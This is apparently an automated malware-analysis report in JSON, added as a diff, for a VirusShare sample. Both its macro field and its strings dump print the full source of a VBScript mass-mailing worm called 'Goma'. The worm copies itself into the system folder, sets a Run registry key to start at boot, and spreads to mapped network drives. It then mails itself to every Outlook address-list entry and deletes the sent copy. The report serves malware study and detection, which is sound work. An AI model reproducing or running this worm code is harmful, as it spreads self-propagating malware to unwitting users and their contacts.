@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "RegRead": "May read registry keys",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "On Error Resume Next\nDim Copiar_arquivo, Alterar_Reg, Criar_OBJ, Contador, Enviar, Abrir_Outlook, Em_mapi, Lista_end, Entradas, Auxiliar \nContador = 0 \nSet Copiar_arquivo = CreateObject( \"Scripting.FileSystemObject\" ) \nCopiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), \"Goma.vbs\" ) \nSet Alterar_Reg = CreateObject( \"WScript.Shell\" ) \nAlterar_Reg.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" & \"GOMA\", Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), \"GOMA.vbs\" ) \nSet Criar_OBJ = CreateObject( \"WScript.Network\" ) \nSet Enviar = Criar_OBJ.EnumNetworkDrives \nIf Enviar.Count <> 0 Then\n   For Contador = 0 To Enviar.Count - 1 \n        If InStr( Enviar.Item( Contador), \"\\\" ) <> 0 Then\n          Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Enviar.Item( Contador), \"GOMA.vbs\" )  \n       End If \n   Next \nEnd If \nContador = Alterar_Reg.RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"GOMA\" ) \nSet Abrir_Outlook = CreateObject( \"Outlook.Application\" ) \n   Set Em_mapi = Abrir_Outlook.GetNameSpace( \"MAPI\" )  \n   For Each Lista_end In Em_mapi.AddressLists \n       Set Enviar = Abrir_Outlook.CreateItem( 0 ) \n       For Entradas = 1 To Lista_end.AddressEntries.Count \n           Set Auxiliar = Lista_end.AddressEntries( Entradas ) \n           If Entradas = 1 Then \n              Enviar.BCC = Auxiliar.Address \n           Else \n              Enviar.BCC = Enviar.BCC & \"; \" & Auxiliar.Address \n           End If \n       Next \n       Enviar.Subject = \"Goma\" \n       Enviar.Body = \"Goma para sempre !!!!\" \n       Enviar.Attachmets.Add WScript.ScriptFullName \n       Enviar.DeleteAfterSubmit = True \n       Enviar.Send \n   Next \nAlterar_Reg.RegWrite \"HKEY_LOCAL_MACHINE\\\" & \"GOMA\", Contador + 1 "
+    },
+    "filename": "VirusShare_3fb67d40f9a80799ef41fb5a849c7001",
+    "filesize": 1837,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3fb67d40f9a80799ef41fb5a849c7001",
+        "sha1": "c6d33a2e966922d521024dacf02053e82065b0de",
+        "sha256": "6bd97abf2e31edca184494f286397c521992a953f8952724c97c9145186df3f7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Dim Copiar_arquivo, Alterar_Reg, Criar_OBJ, Contador, Enviar, Abrir_Outlook, Em_mapi, Lista_end, Entradas, Auxiliar ",
+            "Contador = 0 ",
+            "Set Copiar_arquivo = CreateObject( \"Scripting.FileSystemObject\" ) ",
+            "Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), \"Goma.vbs\" ) ",
+            "Set Alterar_Reg = CreateObject( \"WScript.Shell\" ) ",
+            "Alterar_Reg.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" & \"GOMA\", Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), \"GOMA.vbs\" ) ",
+            "Set Criar_OBJ = CreateObject( \"WScript.Network\" ) ",
+            "Set Enviar = Criar_OBJ.EnumNetworkDrives ",
+            "If Enviar.Count <> 0 Then",
+            "   For Contador = 0 To Enviar.Count - 1 ",
+            "        If InStr( Enviar.Item( Contador), \"\\\" ) <> 0 Then",
+            "          Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Enviar.Item( Contador), \"GOMA.vbs\" )  ",
+            "       End If ",
+            "   Next ",
+            "End If ",
+            "Contador = Alterar_Reg.RegRead( \"HKEY_LOCAL_MACHINE\\\" & \"GOMA\" ) ",
+            "Set Abrir_Outlook = CreateObject( \"Outlook.Application\" ) ",
+            "   Set Em_mapi = Abrir_Outlook.GetNameSpace( \"MAPI\" )  ",
+            "   For Each Lista_end In Em_mapi.AddressLists ",
+            "       Set Enviar = Abrir_Outlook.CreateItem( 0 ) ",
+            "       For Entradas = 1 To Lista_end.AddressEntries.Count ",
+            "           Set Auxiliar = Lista_end.AddressEntries( Entradas ) ",
+            "           If Entradas = 1 Then ",
+            "              Enviar.BCC = Auxiliar.Address ",
+            "           Else ",
+            "              Enviar.BCC = Enviar.BCC & \"; \" & Auxiliar.Address ",
+            "           End If ",
+            "       Next ",
+            "       Enviar.Subject = \"Goma\" ",
+            "       Enviar.Body = \"Goma para sempre !!!!\" ",
+            "       Enviar.Attachmets.Add WScript.ScriptFullName ",
+            "       Enviar.DeleteAfterSubmit = True ",
+            "       Enviar.Send ",
+            "   Next ",
+            "Alterar_Reg.RegWrite \"HKEY_LOCAL_MACHINE\\\" & \"GOMA\", Contador + 1 "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.274292",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
